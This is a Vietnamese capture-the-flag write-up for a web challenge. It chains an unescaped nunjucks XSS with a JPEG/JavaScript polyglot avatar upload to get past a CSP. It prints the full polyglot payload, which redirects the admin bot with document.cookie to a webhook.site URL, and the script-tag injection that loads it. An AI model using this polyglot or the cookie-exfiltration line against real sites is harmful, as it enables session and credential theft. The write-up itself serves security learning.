# TwoDots Horror

Bài này họ cho một trang web đăng truyện ma, câu truyện sẽ dài 2 chữ, mỗi câu end bằng 1 dấu chấm. Bên dưới backend sẽ check nếu câu có đúng 2 dấu chấm thì sẽ đăng lên feed và cho admin (con bot) truy cập vào

## Challenge analyzing 
Thấy con bot thì ta đoán được đây là 1 challenge client side, về con bot thì nó chạy bằng puppeteer, flag sẽ được set làm cookie cho nó 

Vậy lỗi client side ở đây là gì? Đọc file feed.html ta sẽ thấy instruction `{{ post.content|safe }}`, về từ khoá safe thì ở bài này template engine sử dụng là nunjucks, nunjucks kế thừa nhiều cú pháp của engine jinja2 bên flask, từ khoá safe này cũng vậy, đây là từ khoá dùng để "mark" là output này safe, không cần phải escape các ký tự đặc biệt (nói nôm na là in ra literal HTML). Vậy có thể thấy đây có vẻ là lỗi XSS, tuy nhiên trang này cũng đã config CSP:
```javascript
res.setHeader("Content-Security-Policy", "default-src 'self'; object-src 'none'; style-src 'self' https://fonts.googleapis.com; font-src 'self' https://fonts.gstatic.com;")
```

Nhìn qua thì thấy đà này chắc là không bypass được rồi :v mình chuyển qua xem các chức năng khác. Có một chức năng thú vị đó là upload avatar tại endpoint `/api/upload`, avatar sau khi upload sẽ được check bằng middleware trong `UploadHelper.js`, trong function middleware có sử dụng 2 module bên thứ 3 là `is-jpg` và `image-size` để kiểm tra file jpg và lấy width/height của ảnh

Sau khi avatar được upload, ta có thể vào endpoint `/api/avatar/:username` để xem avatar. Ok ý tưởng nãy ra, ta có thể upload một file chứa javascript và sử dụng lỗi XSS kia để chĩa src đến endpoint `/api/avatar/:username` nhằm load script trong file này và thực thi, tuy nhiên ta cần 2 điều kiện là Content-Type trả về không được là kiểu ảnh (endpoint trên trả về application/octet-stream), tại vì nếu là kiểu ảnh thì khi chỉa src tới nó sẽ không load. Điều kiện thứ 2 là ta phải làm cách nào đó khiến cho nội dung trong file trả về không bị syntax error, tại nó trải qua 2 thư viện thao tác JPG nên hẳn sẽ bị lỗi nếu ta cố gắng up một cái script hoàn chỉnh lên

## Vào việc

Giờ ta sẽ thử upload lên một file js hoàn chỉnh xem sao

![](https://i.imgur.com/6uTvKoq.png) 

Bị chặn rùi, nhìn vào function middleware check upload ta sẽ thấy nó fail ở đoạn gọi đến hàm check `isJpg`
```javascript
 if (!isJpg(file.data)) return reject(new Error("Please upload a valid JPEG image!"));
```

Lúc này ý tưởng tiếp theo, mình sẽ vào thẳng thư việc `isJpg` để xem cách nó check. Khi lên git của nó tại https://github.com/sindresorhus/is-jpg

Lên git của nó đọc thì thấy nó check khá đơn giản, 3 byte đầu phải là `ÿØÿ` (signature của JPG)
```javascript
export default function isJpg(buffer) {
	if (!buffer || buffer.length < 3) {
		return false;
	}

	return buffer[0] === 255
		&& buffer[1] === 216
		&& buffer[2] === 255;
}
```
Vậy thêm 3 byte đầu vào thôi, nhưng mà lại phát sinh vấn đề là 3 byte này có thể làm nội dung file js bị lỗi syntax, ta cũng không thể dùng // để comment bọn nó lại vì nó bắt buộc phải là 3 byte đầu tiên, vậy ta có thể biến nó thành một tên biến kiểu như `ÿØÿa = 'a';`, nhưng không có từ khoá let/var/const đằng trước liệu nó có lỗi không? Thật ra là không, vì ở context của browser thì nếu không có từ khoá khai báo let/var/const trước một phép gán và nếu biến đó cũng chưa tồn tại thì nó sẽ xem biến này là một property của object `window`, nói chung là không ảnh hưởng

![](https://i.imgur.com/XbBbNEw.png)

Ok vẫn lỗi nhưng mà lỗi khác :v có vẻ ta đã pass qua vòng check đầu, giờ đến vòng check 2 là `image-size`, lại như module kia, ta lại mò đến source để xem cách nó xử lý

https://github.com/image-size/image-size

Code thằng này nhiều hơn thằng kia một chút, tóm lại thì logic xử lý chính nó sẽ thế này. Check type, vì đang là jpg nên nó sẽ chạy đến phần lấy size của JPG. Tại hàm `calculate` của JPG skip qua 4 signature byte đầu, read 2 byte đầu từ buffer và chứa vào biến `i`, biến i sẽ truyền vào `validateBuffer`, tại đây check nếu thấy i lớn hơn size của buffer truyền vô (cái ảnh) nó sẽ throw exception, và nếu tại index i của buffer mà character không phải 0xff (`ÿ`) thì nó chũng throw exception. Nếu pass qua vòng này ta sẽ tới phần check xem là tại vị trí i + 1 nếu là một trong các byte `0xC0 | 0xC1  | 0xC2` thì tí sẽ return về size của ảnh.

Ok xong rồi, giờ ý tưởng của mình là craft một payload để khiến i nó nhỏ nhỏ xíu (vì nó đọc 2 byte, ví dụ aa là 0x61 và 0x61 nó sẽ đọc thành 0x6161), vì nó skip qua 4 byte đầu nên mình sẽ padding cái signature byte thêm 1 byte, sau đó dùng 2 ký tự xuống dòng (0x0a0a) sẽ làm cho cái i nó nhỏ nhỏ để tí không phải padding quá nhiều, và vì a [\n\n] = ... trong JS cũng hợp lệ nên không vấn đề gì

Sau khi debug trên local thì mình biết giá trị của i khi pass 2 dấu xuống dòng vào là 3338, ta sẽ padding để tí nữa khi nó đọc byte tại index 3338 sẽ là ký tự 0xff, và tiếp sau đó là 0xC0 và padding thêm vài byte size nữa ( bạn xem hàm extractSize, nó sẽ extract mấy byte sau 0xC0 làm width và height cho ảnh, này mình padding mấy chữ f vô chắc là ổn rồi, tí vì chỉ cần nó đều trên 120 để pass cái check là được  )

Ta sẽ có payload:
```!
ÿØÿa

='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA';window.location.href='https://webhook.site/68a40976-d351-4dde-a022-b23547e4cc1c/?c='+document.cookie;//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'//ÿÀffffffff
```

Trong phần padding mấy chữ A mình cũng chèn cả payload vào nữa, nhưng cả phần payload và padding đều phải chính xác từng byte để tí không bị lệch khi get size

Giờ ta upload lên và dùng XSS chèn thẻ script chỉa đến endpoint avatar

![](https://i.imgur.com/eeRMAOL.png)

Sau khi làm thử thì không thấy request gửi về webhook, thử trên trình duyệt thì thấy nó báo lỗi ở 3 byte đầu, shiet.

Research một hồi mình tìm được bài https://portswigger.net/research/bypassing-csp-using-polyglot-jpegs

Thử thêm `charset="ISO-8859-1"` vào thẻ script và gửi lại thì request đã nằm trên webhook cùng với flag

Payload: 
```
</p>a.a.<script charset="ISO-8859-1" src="/api/avatar/shin24"></script>
```

![](https://i.imgur.com/fsBFH4Q.png)
